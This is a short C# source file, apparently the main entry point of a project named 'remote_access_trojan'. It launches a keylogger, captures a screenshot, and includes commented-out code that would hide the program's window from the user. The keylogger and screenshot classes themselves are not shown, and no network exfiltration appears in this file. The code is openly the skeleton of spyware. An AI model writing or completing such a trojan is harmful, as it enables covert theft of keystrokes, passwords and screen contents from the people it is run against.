using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace remote_access_trojan
{
    class Program
    {
        const int SW_HIDE = 0;

        static void Main(string[] args)
        {
            // Hide the window on open
            //var handle = GetConsoleWindow();
            //ShowWindow(handle, SW_HIDE);

            Console.WriteLine("Hello World!");
            Keylogger.Run();

            Screenshot screenshotManager = new Screenshot();
            screenshotManager.takeScreenshot();

        }
    }
}
